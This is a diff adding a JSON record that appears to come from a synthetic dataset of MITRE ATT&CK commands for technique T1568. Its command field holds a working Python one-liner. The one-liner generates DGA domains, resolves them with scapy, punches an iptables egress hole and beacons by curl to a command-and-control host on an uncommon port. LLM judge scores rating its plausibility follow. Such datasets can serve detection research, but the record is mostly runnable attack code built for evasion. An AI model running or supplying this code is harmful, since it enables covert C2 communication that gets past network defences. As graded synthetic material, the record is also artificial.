@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ops-key'; tlds=['com','net','org','biz']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().date())+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:12]+'.'+tlds[i%len(tlds)] for i in range(n)]\nresolvers=['8.8.8.8','1.1.1.1']\nip=None; dom=None; port=random.choice([8443,2053,8088,10443])\nfor d in dga(20):\n    got=False\n    for r in resolvers:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ip=a.rdata; dom=d; got=True; break\n        if got: break\n    if got: break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','-A','curl/7.79',f'http://{dom}:{port}/ping'])\n    print(dom,ip,port)\"",
+  "explanation": "Generates DGA domains, resolves one via DNS, then whitelists and probes an irregular high-port C2 endpoint to reduce detection.",
+  "rationale_steps": [
+    "Use DGA seeded by current UTC date to create ephemeral domains.",
+    "Resolve candidates with scapy DNS queries against multiple public resolvers.",
+    "Pick first A record and open egress via iptables only to that IP and a high, uncommon port.",
+    "Validate reachability with a curl beacon using a benign user agent."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-c0ea71a4",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is well-formed with properly balanced quotes, parentheses, and braces, correct imports, valid function definitions, and proper control flow structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The code perfectly implements the T1568 Dynamic Resolution technique by generating DGA domains based on the current date, attempting to resolve them through multiple DNS servers, establishing a connection to a successfully resolved domain on a randomized high port, and even includes evasion techniques like iptables whitelisting and custom user-agent.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:39:26.947735Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed, including balanced quotes, parentheses, and valid syntax for all modules and constructs used, wrapped correctly for `python3 -c` execution.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements DGA and dynamic DNS resolution, but the `iptables` modification step is not operationally plausible with the stated `Privilege: None`, impacting the 'whitelists' claim.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T06:39:42.983413Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed python3 -c code with balanced quoting, valid scapy/curl/iptables usage, and proper separators.",
+        "semantic_score": 3,
+        "semantic_justification": "Implements DGA-based dynamic resolution and conditional probing consistent with T1568, but scapy DNS packets and iptables typically require root and generated domains are unlikely to resolve, limiting practical execution under stated privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:40:12.583454Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
